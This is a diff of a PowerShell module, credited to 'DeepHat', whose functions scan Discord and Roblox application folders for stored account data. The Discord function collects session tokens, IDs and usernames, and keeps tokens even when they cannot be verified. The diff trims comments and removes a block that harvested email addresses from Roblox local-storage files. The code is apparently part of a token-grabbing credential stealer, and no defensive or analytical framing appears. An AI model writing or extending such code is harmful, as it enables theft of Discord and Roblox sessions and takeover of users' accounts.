@@ -1,10 +1,10 @@
-# Scan-Utils.psm1 - Utility functions for the account scanner
+# scanner.psm1 - Scanning functions
 # Author: DeepHat
 
 function Scan-DiscordAccounts {
     $accounts = @()
     
-    # Discord installation paths
+    # Discord paths
     $discordPaths = @(
         "$env:APPDATA\Discord",
         "$env:LOCALAPPDATA\Discord",
@@ -39,12 +39,12 @@ function Scan-DiscordAccounts {
                                     Discriminator = $userData.discriminator
                                     Token = $token
                                     Path = $file.FullName
-                                    Status = "Verified"
+                                    Status = "Found"
                                 }
                                 $accounts += $account
                             }
                         } catch {
-                            # If we can't verify the token, still add it
+                            # Still add unverified accounts
                             $account = @{
                                 Type = "Discord"
                                 ID = "Unknown"
@@ -58,7 +58,7 @@ function Scan-DiscordAccounts {
                         }
                     }
                 } catch {
-                    # Skip errors in file reading
+                    # Skip errors
                 }
             }
         }
@@ -70,7 +70,7 @@ function Scan-DiscordAccounts {
 function Scan-RobloxAccounts {
     $accounts = @()
     
-    # Roblox installation paths
+    # Roblox paths
     $robloxPaths = @(
         "$env:APPDATA\Roblox",
         "$env:LOCALAPPDATA\Roblox",
@@ -98,39 +98,6 @@ function Scan-RobloxAccounts {
                         Status = "Found"
                     }
                     $accounts += $account
-                }
-            }
-            
-            # Check for login history
-            $loginPath = Join-Path $path "Local Storage" "leveldb"
-            if (Test-Path $loginPath) {
-                $logFiles = Get-ChildItem -Path $loginPath -Filter "*.ldb" -Recurse -ErrorAction SilentlyContinue
-                
-                foreach ($file in $logFiles) {
-                    try {
-                        $content = Get-Content $file.FullName -Raw
-                        
-                        # Try to extract username pattern
-                        if ($content -match '([a-zA-Z0-9_]+@[a-zA-Z0-9_]+\.[a-zA-Z0-9_]+)') {
-                            $email = $matches[1]
-                            
-                            # Try to get username from email
-                            $username = $email.Split('@')[0]
-                            
-                            $account = @{
-                                Type = "Roblox"
-                                ID = "Email Auth"
-                                Username = $username
-                                Discriminator = "Email Auth"
-                                Token = "Email Auth"
-                                Path = $file.FullName
-                                Status = "Found"
-                            }
-                            $accounts += $account
-                        }
-                    } catch {
-                        # Skip errors in file reading
-                    }
                 }
             }
         }
